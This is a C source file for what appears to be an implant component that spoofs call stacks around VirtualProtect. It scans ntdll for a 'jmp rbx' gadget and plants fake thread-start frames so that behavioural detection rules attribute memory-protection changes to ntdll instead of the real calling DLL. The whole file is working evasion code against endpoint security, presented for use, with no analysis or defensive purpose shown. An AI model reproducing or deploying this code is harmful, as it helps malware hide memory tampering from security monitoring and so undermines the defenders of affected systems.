/*
 * spoof.c — call-stack synthesis wrapper around VirtualProtect.
 *
 * Behavioural rules resolve "call_stack_final_user_module" by walking RSP
 * upward from the syscall site and picking the topmost signed frame. If
 * the immediate return address stored on the stack when VirtualProtect
 * runs points into ntdll, and the frames above look like a thread-start
 * chain (BaseThreadInitThunk → RtlUserThreadStart), the walker resolves
 * the caller to ntdll — not the DLL that actually issued the call.
 *
 * spoof_call (asm stub) rewrites the top of the stack with:
 *   [rsp]     = ntdll `jmp rbx` gadget      (fake immediate return addr)
 *   [rsp+8..] = 32-byte Win64 shadow space
 *   [rsp+40]  = kernel32!BaseThreadInitThunk (fake grandparent frame)
 *   [rsp+48]  = ntdll!RtlUserThreadStart     (fake great-grandparent)
 * then jumps into VirtualProtect. When VP returns, it lands on the ntdll
 * gadget, which `jmp rbx` routes back to a trampoline that unwinds the
 * synthesised frames and returns to the real caller.
 *
 * ponytail: gadget/frame addresses live in file-scope globals; safe here
 * because spoof_vp only fires from DllMain (loader lock) and the delayed
 * restore thread (2s after DllMain returns) — no concurrent callers. If
 * this ever goes multi-threaded, move state to TLS.
 */

#include <windows.h>
#include "spoof.h"

/* Consumed by spoof_stub.S via [rip + name]. Zero-initialised → spoof_vp
 * falls back to plain VirtualProtect (see spoof_init failure path). */
void *g_ntdll_gadget;    /* address of `jmp rbx` (FF E3) inside ntdll */
void *g_frame_kernel32;  /* fake kernel32 frame — BaseThreadInitThunk    */
void *g_frame_ntdll;     /* fake ntdll frame — RtlUserThreadStart        */
void *g_saved_ret;       /* real return address of spoof_call            */
void *g_saved_rbx;       /* caller's rbx (callee-saved in both ABIs)     */

extern __attribute__((sysv_abi)) LONG spoof_call(
    void *fn, void *a1, SIZE_T a2, DWORD a3, void *a4);

/* Scan a module's .text for the 2-byte `jmp rbx` opcode (FF E3). */
static void *find_jmp_rbx(HMODULE mod)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mod;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)mod + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) != 0) continue;
        BYTE *p  = (BYTE *)mod + sec[i].VirtualAddress;
        DWORD n  = sec[i].Misc.VirtualSize;
        for (DWORD off = 0; off + 1 < n; off++) {
            if (p[off] == 0xFF && p[off + 1] == 0xE3)
                return &p[off];
        }
        break;
    }
    return NULL;
}

int spoof_init(void)
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    HMODULE k32   = GetModuleHandleW(L"kernel32.dll");
    if (!ntdll || !k32) return 0;

    void *gadget = find_jmp_rbx(ntdll);
    void *rtlus  = (void *)GetProcAddress(ntdll, "RtlUserThreadStart");
    void *btit   = (void *)GetProcAddress(k32,   "BaseThreadInitThunk");
    if (!gadget || !rtlus || !btit) return 0;

    g_ntdll_gadget   = gadget;
    g_frame_ntdll    = rtlus;
    g_frame_kernel32 = btit;
    return 1;
}

BOOL spoof_vp(void *addr, SIZE_T size, DWORD newProt, DWORD *oldProt)
{
    if (!g_ntdll_gadget)
        return VirtualProtect(addr, size, newProt, oldProt);
    return (BOOL)spoof_call((void *)VirtualProtect, addr, size, newProt, oldProt);
}
